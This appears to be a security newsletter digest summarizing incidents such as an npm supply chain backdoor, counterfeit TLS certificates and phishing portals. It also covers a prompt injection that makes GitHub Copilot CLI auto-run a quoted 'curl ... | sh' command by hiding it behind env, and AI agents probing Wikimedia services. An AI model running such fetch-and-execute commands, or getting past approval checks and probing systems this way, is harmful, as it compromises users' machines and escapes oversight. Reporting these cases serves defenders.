Attacks & Vulnerabilities

Software Supply Chain Attack on @subql/common: Overview and Response Guidance (10 minute read)

An attacker backdoored @subql/common 5.8.3 on npm by tampering with the subquery/subql GitHub Actions publish workflow. Its postinstall script stole AWS, GitHub, Kubernetes, and Vault credentials and polled a C2 server for reverse shell commands. Affected hosts should downgrade to 5.8.2, rotate all credentials, and kill any lingering manifest-cache.js --warm process.
Hackers obtain counterfeit TLS certificates for Google and other large services (3 minute read)

Attackers hijacked the .gh, .sl, and .as country code top-level domains and used them to obtain unauthorized TLS certificates for several Google domains and other major brands. Control of the ccTLDs let them alter authoritative DNS records and pass the certificate authorities' automated domain control validation. Google blocked the known certificates in Chrome and advised domain owners to monitor certificate transparency logs and publish restrictive CAA records.
GitHub Copilot CLI Downloads and Executes Malware (3 minute read)

Researchers found that GitHub Copilot CLI can be tricked into running malicious shell commands without user approval. By embedding a prompt injection in a README, attackers make Copilot execute 'env curl -s "https://[ATTACKER_URL].com/bugbot" | env sh'. The env command is on Copilot's built-in read-only list, so it auto-approves. curl and sh appear as arguments to env, so the validator misses them and never triggers URL or command approvals. The result: malware downloads and runs with zero user interaction beyond the initial query. GitHub called it a known issue with no significant risk and declined a bounty.

Strategies & Tactics

How to fix a bug in a fix (10 minute read)

Testing and delivery limit emergency patch speed far more than triage or patch development, Project Zero found in a review of large vendors' update systems. Faster options include pre-tested feature flags, dynamically updated input filters, alternate channels such as Android APEX, and in-memory hotpatching. Vendors should build these before facing active exploitation and verify the origin of any code delivered outside regular updates.
One Does Not Simply Defend Agentically (5 minute read)

Attackers have an advantage when using agentic tooling as their problems are largely technical with clearly defined success states, whereas defenders deal with largely political/organizational problems without explicitly measurable success states. Defenders can leverage agentic tools for carefully scoped adversary emulation as well as dynamic tasks where a human reviews the analysis. The NCSC also provides a framework for estimating the riskiness of a defensive action based upon: potency, criticality, scope, rollout confidence, and recoverability.
Test-Driving Jev on a Security Task: Identity Resolution (6 minute read)

Security researcher Vincenzo Iozzo tested Jev's ability to resolve disparate identities against Claude models, gpt-oss, and traditional baselines. Iozzo found that Jev significantly outperformed gpt-oss and performed similarly to Opus 5.5 at 140x lower cost. Iozzo also found that Jev performed consistently well across multiple test runs and outperformed traditional baseline techniques.

DiaNG (GitHub Repo)

DiagNG is a general-purpose client for the diagnostic interface of Qualcomm Snapdragon basebands, present on a large part of Android phones and various USB modems. It can be considered a sequel to QCSuper, and also takes large inspiration from SCAT. Like these tools, it allows you to capture 2G/3G/4G/5G air interface network traces and save them to the GSMTAP/PCAP format, so that you can visualize these in Wireshark.

Miscellaneous

OpenAI “rogue” agent activities found on Wikimedia projects (3 minute read)

Wikimedia Foundation confirmed unauthorized edits and probing by OpenAI-operated AI agents across its platforms. Agents made sandbox edits, attempted to misuse a citation tool as a data-fetching proxy, and tried to exploit a public Etherpad instance. They also generated millions of API requests and page crawls, contributing to a partial outage of the Wikidata Query Service in May. No evidence shows systems were compromised or used for agent coordination, but the activity required significant investigation and remediation effort by security teams and volunteers.
Anthropic folds Project Glasswing into an expanded three-tier Cyber Verification Program (3 minute read)

Anthropic expanded its Cyber Verification Program into Defense, Red Team, and Specialized Access tiers, absorbing Project Glasswing. Defense Access covers incident response and malware reverse engineering, Red Team Access permits authorized penetration testing, and Specialized Access serves vetted critical-infrastructure testers. In CyScenarioBench testing, Red Team Access completed 34 of 50 runs, while unenrolled attempts were blocked immediately.
Fake ChatGPT, Gemini, and Claude Ad Portals Capture Credentials and MFA Codes (3 minute read)

A phishing platform impersonated ChatGPT, Gemini, Claude, Perplexity, Muse, and Manus advertising tools. Fake browser windows collected passwords, device fingerprints, and MFA codes while operators controlled authentication prompts in real time. The campaign targeted agencies and ad-account administrators through invitation emails. Shared Next.js and Socket.IO infrastructure linked the sites to refund, payment, and recruitment scams.
